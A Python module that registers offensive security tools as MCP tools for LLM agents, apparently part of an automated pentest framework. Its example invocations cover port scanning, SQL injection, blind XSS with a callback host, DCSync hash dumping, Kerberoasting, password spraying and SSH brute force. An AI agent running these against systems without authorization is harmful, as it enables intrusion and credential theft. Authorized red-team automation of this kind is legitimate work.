"""Arsenal registry — declarative pentest-tool catalog.

Each ``ToolSpec`` describes one CLI:
- name: MCP tool name agents see
- binary: actual binary path / command
- arg_schema: typed args -> CLI flag map
- output_parser: extract structured findings from stdout
- requires_root: privileged ops
- category: ad / web / recon / cloud / mobile / re
- examples: 1-3 invocation patterns for the LLM to pattern-match

Tools execute via the standard ``bash`` tool through DockerSandbox —
no special runtime needed. The arsenal layer is **value-adding metadata**:
typed args, validated invocations, output parsing, success/failure
classification.
"""

from __future__ import annotations

from dataclasses import dataclass, field
from typing import Any, Callable


@dataclass(frozen=True)
class ArgSchema:
    """Declarative arg definition. Renders to CLI flags."""

    name: str
    type: type = str
    required: bool = False
    default: Any = None
    description: str = ""
    flag: str | None = None  # CLI flag (e.g. '-p', '--target'). None = positional.
    multi: bool = False  # accept list values
    choices: list[str] | None = None  # constrain to enum

    def render(self, value: Any) -> list[str]:
        if value is None or value == "":
            return []
        if isinstance(value, bool):
            return [self.flag] if value and self.flag else []
        if self.multi and isinstance(value, list):
            out: list[str] = []
            for v in value:
                if self.flag:
                    out.extend([self.flag, str(v)])
                else:
                    out.append(str(v))
            return out
        if self.flag:
            return [self.flag, str(value)]
        return [str(value)]


@dataclass(frozen=True)
class ToolSpec:
    """One pentest binary exposed as an MCP tool."""

    name: str
    binary: str
    description: str
    args: list[ArgSchema]
    category: str  # ad / web / recon / cloud / mobile / re / crypto / utility
    requires_root: bool = False
    needs_internet: bool = False
    output_format: str = "text"  # text / json / xml / csv
    examples: list[str] = field(default_factory=list)
    success_signal: str | None = None  # regex hint for "tool ran successfully"
    install_hint: str | None = None  # e.g. 'apt install nmap' or 'pipx install ...'

    def build_command(self, args: dict[str, Any]) -> list[str]:
        cmd = [self.binary]
        for schema in self.args:
            value = args.get(schema.name, schema.default)
            if schema.required and (value is None or value == ""):
                raise ValueError(f"{self.name}: required arg '{schema.name}' missing")
            if schema.choices and value is not None and str(value) not in schema.choices:
                raise ValueError(
                    f"{self.name}: arg '{schema.name}'={value!r} not in {schema.choices}"
                )
            cmd.extend(schema.render(value))
        return cmd


# ── Registry ─────────────────────────────────────────────────────────

REGISTRY: list[ToolSpec] = [
    # ────────── Recon ──────────
    ToolSpec(
        name="nmap",
        binary="nmap",
        category="recon",
        description="Network scanner — port enum, service detection, OS fingerprint, NSE scripts.",
        args=[
            ArgSchema("target", str, required=True, description="IP/CIDR/hostname"),
            ArgSchema("ports", str, flag="-p", default="-", description="Port spec, e.g. '1-65535' or '80,443'"),
            ArgSchema("service_detection", bool, flag="-sV", description="Service+version probe"),
            ArgSchema("os_detection", bool, flag="-O", description="OS fingerprint (needs root)"),
            ArgSchema("scripts", str, flag="--script", description="NSE script(s), e.g. 'default,vuln'"),
            ArgSchema("timing", str, flag="-T", default="4", choices=["0", "1", "2", "3", "4", "5"]),
            ArgSchema("output_all", str, flag="-oA", description="Output base name; emits .nmap .gnmap .xml"),
            ArgSchema("verbose", bool, flag="-v"),
        ],
        examples=["nmap -sV -p 1-65535 10.0.0.1", "nmap --script vuln -p 80,443 target.com"],
        install_hint="apt install nmap",
    ),
    ToolSpec(
        name="masscan",
        binary="masscan",
        category="recon",
        description="Fast TCP port scanner — internet-scale recon. Faster than nmap, less protocol detail.",
        args=[
            ArgSchema("target", str, required=True, flag="-p", description="(Note: -p is ports; pass IPs as positional)"),
            ArgSchema("ports", str, flag="-p", default="1-65535"),
            ArgSchema("rate", int, flag="--rate", default=10000),
            ArgSchema("interface", str, flag="-e"),
            ArgSchema("output_xml", str, flag="-oX"),
        ],
        requires_root=True,
        examples=["masscan -p 80,443 10.0.0.0/24 --rate 10000 -oX /tmp/scan.xml"],
        install_hint="apt install masscan",
    ),
    ToolSpec(
        name="subfinder",
        binary="subfinder",
        category="recon",
        description="Passive subdomain enumeration via 30+ sources (Chaos, AlienVault, crt.sh, etc).",
        args=[
            ArgSchema("domain", str, flag="-d", required=True),
            ArgSchema("output", str, flag="-o"),
            ArgSchema("silent", bool, flag="-silent"),
            ArgSchema("all_sources", bool, flag="-all"),
            ArgSchema("recursive", bool, flag="-recursive"),
        ],
        needs_internet=True,
        examples=["subfinder -d target.com -silent -o subs.txt"],
        install_hint="go install github.com/projectdiscovery/subfinder/v2/cmd/subfinder@latest",
    ),
    ToolSpec(
        name="httpx",
        binary="httpx",
        category="recon",
        description="Fast HTTP host probing — live check, tech fingerprint, status, title, headers.",
        args=[
            ArgSchema("list", str, flag="-l", description="Path to host list"),
            ArgSchema("target", str, flag="-u", description="Single URL (alt to -l)"),
            ArgSchema("ports", str, flag="-p"),
            ArgSchema("status_code", bool, flag="-sc"),
            ArgSchema("title", bool, flag="-title"),
            ArgSchema("tech_detect", bool, flag="-td"),
            ArgSchema("json", bool, flag="-json"),
            ArgSchema("output", str, flag="-o"),
        ],
        examples=["httpx -l subs.txt -sc -title -td -json -o probed.json"],
        install_hint="go install github.com/projectdiscovery/httpx/cmd/httpx@latest",
    ),
    ToolSpec(
        name="nuclei",
        binary="nuclei",
        category="recon",
        description="Template-based vuln scanner — 8000+ community templates, CVE coverage.",
        args=[
            ArgSchema("target", str, flag="-u"),
            ArgSchema("list", str, flag="-l"),
            ArgSchema("templates", str, flag="-t", multi=True, description="Template dir(s)"),
            ArgSchema("tags", str, flag="-tags", multi=True),
            ArgSchema("severity", str, flag="-severity", description="Comma list: critical,high,medium,low"),
            ArgSchema("json", bool, flag="-j"),
            ArgSchema("output", str, flag="-o"),
            ArgSchema("rate_limit", int, flag="-rl", default=150),
        ],
        needs_internet=True,
        examples=["nuclei -l live.txt -severity critical,high -j -o vulns.json"],
        install_hint="go install github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
    ),
    ToolSpec(
        name="katana",
        binary="katana",
        category="recon",
        description="JavaScript-aware web crawler — endpoint + form + asset discovery.",
        args=[
            ArgSchema("target", str, flag="-u"),
            ArgSchema("list", str, flag="-list"),
            ArgSchema("depth", int, flag="-d", default=3),
            ArgSchema("headless", bool, flag="-headless"),
            ArgSchema("js_crawl", bool, flag="-jc"),
            ArgSchema("output", str, flag="-o"),
        ],
        examples=["katana -u https://target.com -d 5 -jc -o crawl.txt"],
        install_hint="go install github.com/projectdiscovery/katana/cmd/katana@latest",
    ),
    ToolSpec(
        name="dnsx",
        binary="dnsx",
        category="recon",
        description="DNS resolution + record-type probing for live-check.",
        args=[
            ArgSchema("list", str, flag="-l"),
            ArgSchema("resolvers", str, flag="-r"),
            ArgSchema("record_types", str, flag="-recon"),
            ArgSchema("response", bool, flag="-resp"),
            ArgSchema("output", str, flag="-o"),
        ],
        install_hint="go install github.com/projectdiscovery/dnsx/cmd/dnsx@latest",
    ),

    # ────────── Web exploitation ──────────
    ToolSpec(
        name="ffuf",
        binary="ffuf",
        category="web",
        description="Fast web fuzzer — content discovery, parameter brute, vhost enum.",
        args=[
            ArgSchema("url", str, flag="-u", required=True, description="URL w/ FUZZ keyword"),
            ArgSchema("wordlist", str, flag="-w", required=True),
            ArgSchema("match_codes", str, flag="-mc", default="200,204,301,302,307,401,403"),
            ArgSchema("filter_size", str, flag="-fs", description="Filter responses by size"),
            ArgSchema("threads", int, flag="-t", default=40),
            ArgSchema("headers", str, flag="-H", multi=True),
            ArgSchema("output_json", str, flag="-o"),
            ArgSchema("output_format", str, flag="-of", default="json"),
        ],
        examples=["ffuf -u https://target.com/FUZZ -w common.txt -mc 200,301"],
        install_hint="go install github.com/ffuf/ffuf/v2@latest",
    ),
    ToolSpec(
        name="sqlmap",
        binary="sqlmap",
        category="web",
        description="Automated SQL injection testing + post-exploit DB enum.",
        args=[
            ArgSchema("url", str, flag="-u", required=True),
            ArgSchema("data", str, flag="--data"),
            ArgSchema("cookie", str, flag="--cookie"),
            ArgSchema("level", int, flag="--level", default=2),
            ArgSchema("risk", int, flag="--risk", default=1),
            ArgSchema("dbs", bool, flag="--dbs"),
            ArgSchema("dump", bool, flag="--dump"),
            ArgSchema("batch", bool, flag="--batch", default=True),
            ArgSchema("technique", str, flag="--technique", default="BEUSTQ"),
        ],
        examples=["sqlmap -u 'https://target.com/?id=1' --batch --dbs"],
        install_hint="apt install sqlmap",
    ),
    ToolSpec(
        name="dalfox",
        binary="dalfox",
        category="web",
        description="Fast XSS scanner — reflected, DOM, blind w/ callback.",
        args=[
            ArgSchema("mode", str, choices=["url", "file", "pipe"], default="url"),
            ArgSchema("target", str, required=True, description="URL or file path depending on mode"),
            ArgSchema("blind", str, flag="--blind", description="Callback URL for blind XSS"),
            ArgSchema("output", str, flag="-o"),
            ArgSchema("custom_payload", str, flag="--custom-payload"),
        ],
        examples=["dalfox url 'https://target.com/?q=' --blind https://callback.example.com"],
        install_hint="go install github.com/hahwul/dalfox/v2@latest",
    ),
    ToolSpec(
        name="commix",
        binary="commix",
        category="web",
        description="Command injection auto-tester.",
        args=[
            ArgSchema("url", str, flag="--url", required=True),
            ArgSchema("data", str, flag="--data"),
            ArgSchema("cookie", str, flag="--cookie"),
            ArgSchema("level", int, flag="--level", default=1),
            ArgSchema("batch", bool, flag="--batch", default=True),
        ],
        examples=["commix --url 'https://target.com/exec?cmd=ls' --batch"],
        install_hint="apt install commix",
    ),
    ToolSpec(
        name="feroxbuster",
        binary="feroxbuster",
        category="web",
        description="Recursive content discovery — faster than gobuster/dirsearch.",
        args=[
            ArgSchema("url", str, flag="-u", required=True),
            ArgSchema("wordlist", str, flag="-w"),
            ArgSchema("threads", int, flag="-t", default=50),
            ArgSchema("status_codes", str, flag="-s", default="200,204,301,302,307,401,403,500"),
            ArgSchema("output", str, flag="-o"),
        ],
        examples=["feroxbuster -u https://target.com -t 100 -o ferox.txt"],
        install_hint="cargo install feroxbuster",
    ),

    # ────────── Active Directory ──────────
    ToolSpec(
        name="nxc",
        binary="nxc",
        category="ad",
        description="NetExec — CrackMapExec successor. SMB/LDAP/MSSQL/WinRM/RDP/SSH/FTP/VNC + 200 modules.",
        args=[
            ArgSchema("protocol", str, required=True, choices=["smb", "ldap", "mssql", "winrm", "rdp", "ssh", "ftp", "vnc"]),
            ArgSchema("target", str, required=True),
            ArgSchema("user", str, flag="-u"),
            ArgSchema("password", str, flag="-p"),
            ArgSchema("hash", str, flag="-H"),
            ArgSchema("kerberos", bool, flag="-k"),
            ArgSchema("module", str, flag="-M", multi=True),
            ArgSchema("local_auth", bool, flag="--local-auth"),
            ArgSchema("bloodhound", bool, flag="--bloodhound"),
            ArgSchema("json", str, flag="--json"),
        ],
        examples=["nxc smb 10.0.0.0/24 -u alice -p Spring2024!"],
        install_hint="pipx install netexec",
    ),
    ToolSpec(
        name="bloodhound-python",
        binary="bloodhound-python",
        category="ad",
        description="BloodHound collector — LDAP-based AD attack path enum.",
        args=[
            ArgSchema("user", str, flag="-u", required=True),
            ArgSchema("password", str, flag="-p"),
            ArgSchema("domain", str, flag="-d", required=True),
            ArgSchema("collection", str, flag="-c", default="All"),
            ArgSchema("zip", bool, flag="--zip"),
            ArgSchema("dns_server", str, flag="-ns"),
            ArgSchema("output_dir", str, flag="-o"),
        ],
        examples=["bloodhound-python -u alice -p Pass1 -d corp.local -c All --zip -ns 10.0.0.1"],
        install_hint="pipx install bloodhound",
    ),
    ToolSpec(
        name="impacket-GetUserSPNs",
        binary="GetUserSPNs.py",
        category="ad",
        description="Impacket Kerberoasting — request TGS for SPN-bound service accounts.",
        args=[
            ArgSchema("creds", str, required=True, description="DOMAIN/USER:PASS"),
            ArgSchema("dc_ip", str, flag="-dc-ip"),
            ArgSchema("request", bool, flag="-request", default=True),
            ArgSchema("output", str, flag="-outputfile"),
        ],
        examples=["GetUserSPNs.py DOM/USER:'Pass!' -dc-ip 10.0.0.5 -request -outputfile k.hashes"],
        install_hint="pipx install impacket",
    ),
    ToolSpec(
        name="impacket-GetNPUsers",
        binary="GetNPUsers.py",
        category="ad",
        description="Impacket AS-REP Roasting — accounts w/ DONT_REQ_PREAUTH.",
        args=[
            ArgSchema("creds", str, required=True),
            ArgSchema("users_file", str, flag="-usersfile"),
            ArgSchema("dc_ip", str, flag="-dc-ip"),
            ArgSchema("no_pass", bool, flag="-no-pass"),
            ArgSchema("output_format", str, flag="-format", default="hashcat"),
            ArgSchema("output", str, flag="-outputfile"),
        ],
        examples=["GetNPUsers.py DOM/ -usersfile users.txt -dc-ip 10.0.0.5 -no-pass -format hashcat"],
        install_hint="pipx install impacket",
    ),
    ToolSpec(
        name="impacket-secretsdump",
        binary="secretsdump.py",
        category="ad",
        description="Impacket DCSync / SAM dump — extract NTDS/SAM hashes.",
        args=[
            ArgSchema("creds", str, required=True),
            ArgSchema("just_dc", bool, flag="-just-dc"),
            ArgSchema("just_dc_user", str, flag="-just-dc-user"),
            ArgSchema("hashes", str, flag="-hashes"),
            ArgSchema("output", str, flag="-outputfile"),
        ],
        examples=["secretsdump.py 'DOM/admin:Pass!@10.0.0.5' -just-dc -outputfile creds"],
        install_hint="pipx install impacket",
    ),
    ToolSpec(
        name="certipy",
        binary="certipy",
        category="ad",
        description="ADCS attack tool — ESC1-15 scan, request, auth.",
        args=[
            ArgSchema("subcommand", str, required=True, choices=["find", "req", "auth", "account"]),
            ArgSchema("user", str, flag="-u"),
            ArgSchema("password", str, flag="-p"),
            ArgSchema("dc_ip", str, flag="-dc-ip"),
            ArgSchema("target", str, flag="-target"),
            ArgSchema("template", str, flag="-template"),
            ArgSchema("upn", str, flag="-upn"),
            ArgSchema("output", str, flag="-output"),
        ],
        examples=["certipy find -u alice -p Pass! -dc-ip 10.0.0.5 -output /tmp/adcs"],
        install_hint="pipx install certipy-ad",
    ),
    ToolSpec(
        name="kerbrute",
        binary="kerbrute",
        category="ad",
        description="Kerberos user enum + password spray via pre-auth.",
        args=[
            ArgSchema("subcommand", str, required=True, choices=["userenum", "passwordspray", "bruteuser", "bruteforce"]),
            ArgSchema("domain", str, flag="--domain", required=True),
            ArgSchema("dc", str, flag="--dc"),
            ArgSchema("user_list", str, description="Positional after subcommand"),
            ArgSchema("password", str, description="Positional for passwordspray"),
        ],
        examples=["kerbrute userenum --dc 10.0.0.5 --domain corp.local users.txt"],
        install_hint="go install github.com/ropnop/kerbrute@latest",
    ),

    # ────────── Cred crack ──────────
    ToolSpec(
        name="hashcat",
        binary="hashcat",
        category="crypto",
        description="GPU-accelerated hash cracking — 13100/19700/18200 Kerberos, 16500 JWT, 0/100 md5/sha1, etc.",
        args=[
            ArgSchema("mode", int, flag="-m", required=True),
            ArgSchema("attack_mode", int, flag="-a", default=0),
            ArgSchema("hashes_file", str, required=True),
            ArgSchema("wordlist", str, description="Positional"),
            ArgSchema("rules", str, flag="-r"),
            ArgSchema("output", str, flag="-o"),
            ArgSchema("workload", int, flag="-w", default=3),
        ],
        examples=["hashcat -m 13100 -a 0 kerb.hashes rockyou.txt -r best64.rule"],
        install_hint="apt install hashcat",
    ),
    ToolSpec(
        name="john",
        binary="john",
        category="crypto",
        description="John the Ripper — CPU-based cracking, handles esoteric formats hashcat lacks.",
        args=[
            ArgSchema("hashes_file", str, required=True),
            ArgSchema("format", str, flag="--format"),
            ArgSchema("wordlist", str, flag="--wordlist"),
            ArgSchema("rules", str, flag="--rules"),
            ArgSchema("show", bool, flag="--show"),
        ],
        examples=["john --wordlist=rockyou.txt --format=krb5asrep asrep.hashes"],
        install_hint="apt install john",
    ),
    ToolSpec(
        name="hydra",
        binary="hydra",
        category="crypto",
        description="Online password brute-force — SSH/FTP/HTTP/RDP/SMB/SMTP/POP3/MySQL/PostgreSQL.",
        args=[
            ArgSchema("user", str, flag="-l"),
            ArgSchema("user_list", str, flag="-L"),
            ArgSchema("password", str, flag="-p"),
            ArgSchema("password_list", str, flag="-P"),
            ArgSchema("target", str, required=True, description="Positional: target:port"),
            ArgSchema("protocol", str, required=True, description="Positional: ssh|ftp|http-post-form|smb|..."),
            ArgSchema("threads", int, flag="-t", default=16),
            ArgSchema("output", str, flag="-o"),
        ],
        examples=["hydra -l alice -P rockyou.txt 10.0.0.5 ssh -t 4"],
        install_hint="apt install hydra",
    ),

    # ────────── Decode / crypto ──────────
    ToolSpec(
        name="ciphey",
        binary="ciphey",
        category="crypto",
        description="A*-search auto-decrypt — 16+ decoders + BERT plaintext detector.",
        args=[
            ArgSchema("ciphertext", str, flag="-t", required=True),
            ArgSchema("quiet", bool, flag="-q"),
            ArgSchema("language", str, flag="-l", default="en"),
        ],
        examples=["ciphey -t 'aGVsbG8gd29ybGQ='"],
        install_hint="pipx install ciphey",
    ),
    ToolSpec(
        name="hashid",
        binary="hashid",
        category="crypto",
        description="Identify hash type from format heuristics.",
        args=[
            ArgSchema("hash_or_file", str, required=True, description="Hash literal or path"),
            ArgSchema("from_file", bool, flag="-f"),
            ArgSchema("extended", bool, flag="-e"),
        ],
        examples=["hashid '\\$2a\\$12\\$abc...'"],
        install_hint="pipx install hashid",
    ),

    # ────────── Reversing ──────────
    ToolSpec(
        name="binwalk",
        binary="binwalk",
        category="re",
        description="Firmware extraction + signature scan.",
        args=[
            ArgSchema("target", str, required=True),
            ArgSchema("extract", bool, flag="-e"),
            ArgSchema("matryoshka", bool, flag="-M", description="Recursive extract"),
            ArgSchema("entropy", bool, flag="-E"),
            ArgSchema("output_dir", str, flag="-C"),
        ],
        examples=["binwalk -eM firmware.bin"],
        install_hint="apt install binwalk",
    ),
    ToolSpec(
        name="strings",
        binary="strings",
        category="re",
        description="Extract printable strings from a binary.",
        args=[
            ArgSchema("file", str, required=True),
            ArgSchema("min_length", int, flag="-n", default=4),
            ArgSchema("all_sections", bool, flag="-a"),
        ],
        examples=["strings -n 8 /tmp/sample"],
        install_hint="apt install binutils",
    ),
    ToolSpec(
        name="r2",
        binary="r2",
        category="re",
        description="radare2 — RE workbench. Use -c for script mode.",
        args=[
            ArgSchema("file", str, required=True),
            ArgSchema("command", str, flag="-c", description="r2 commands; ';' separated"),
            ArgSchema("quiet", bool, flag="-q", default=True),
            ArgSchema("analyze", bool, flag="-A"),
        ],
        examples=["r2 -A -q -c 'afl;axt @ main' /tmp/binary"],
        install_hint="apt install radare2",
    ),

    # ────────── Mobile ──────────
    ToolSpec(
        name="jadx",
        binary="jadx",
        category="mobile",
        description="Android APK -> Java pseudo-code decompiler.",
        args=[
            ArgSchema("apk", str, required=True, description="Positional"),
            ArgSchema("output_dir", str, flag="-d"),
            ArgSchema("show_bad_code", bool, flag="--show-bad-code"),
        ],
        examples=["jadx -d /tmp/decomp /path/to/app.apk"],
        install_hint="apt install jadx",
    ),
    ToolSpec(
        name="apktool",
        binary="apktool",
        category="mobile",
        description="APK decode (smali) + rebuild.",
        args=[
            ArgSchema("subcommand", str, required=True, choices=["d", "b"]),
            ArgSchema("input", str, required=True),
            ArgSchema("output_dir", str, flag="-o"),
            ArgSchema("force", bool, flag="-f"),
        ],
        examples=["apktool d app.apk -o /tmp/smali"],
        install_hint="apt install apktool",
    ),

    # ────────── Cloud ──────────
    ToolSpec(
        name="aws",
        binary="aws",
        category="cloud",
        description="AWS CLI — IAM/S3/EC2/Lambda/etc. Use a sub-command-and-args structure.",
        args=[
            ArgSchema("service", str, required=True, description="e.g. 's3', 'iam', 'sts'"),
            ArgSchema("operation", str, required=True, description="e.g. 'list-buckets'"),
            ArgSchema("extra_args", str, multi=True, description="Additional flag/value pairs"),
            ArgSchema("output", str, flag="--output", default="json", choices=["json", "text", "table"]),
        ],
        examples=["aws sts get-caller-identity", "aws s3 ls --recursive"],
        install_hint="apt install awscli OR pipx install awscli",
    ),
    ToolSpec(
        name="kubectl",
        binary="kubectl",
        category="cloud",
        description="Kubernetes CLI.",
        args=[
            ArgSchema("subcommand", str, required=True),
            ArgSchema("resource", str, description="Resource type/name"),
            ArgSchema("namespace", str, flag="-n"),
            ArgSchema("output", str, flag="-o", default="yaml"),
            ArgSchema("all_namespaces", bool, flag="--all-namespaces"),
        ],
        examples=["kubectl get pods --all-namespaces -o wide"],
        install_hint="apt install kubectl",
    ),
]


# ── MCP server builder ────────────────────────────────────────────────


def build_arsenal_server(sandbox: Any) -> Any:
    """Construct a FastMCP server exposing each ToolSpec as an MCP tool.

    Args:
        sandbox: DockerSandbox (or compatible) backend with a
            ``run(cmd: list[str], timeout: int) -> dict`` method.

    Returns:
        FastMCP server instance ready for ``server.run()``.
    """
    try:
        from mcp.server.fastmcp import FastMCP
    except ImportError as e:
        raise ImportError(
            "fastmcp not installed. Install: pipx install mcp[server]"
        ) from e

    mcp = FastMCP("decepticon-arsenal")

    def _make_tool(spec: ToolSpec) -> Callable:
        async def _run(**kwargs: Any) -> dict[str, Any]:
            try:
                cmd = spec.build_command(kwargs)
            except ValueError as exc:
                return {"error": str(exc), "tool": spec.name}
            try:
                result = await sandbox.run(cmd, timeout=kwargs.get("_timeout", 300))
            except Exception as exc:  # noqa: BLE001 — surface backend errors
                return {"error": f"sandbox error: {exc}", "cmd": " ".join(cmd)}
            return {
                "tool": spec.name,
                "cmd": " ".join(cmd),
                "stdout": result.get("stdout", ""),
                "stderr": result.get("stderr", ""),
                "exit_code": result.get("exit_code"),
                "elapsed": result.get("elapsed"),
            }

        _run.__name__ = spec.name
        _run.__doc__ = spec.description + "\n\nExamples:\n  " + "\n  ".join(spec.examples)
        return _run

    for spec in REGISTRY:
        mcp.tool(name=spec.name)(_make_tool(spec))

    return mcp


__all__ = ["REGISTRY", "ToolSpec", "ArgSchema", "build_arsenal_server"]
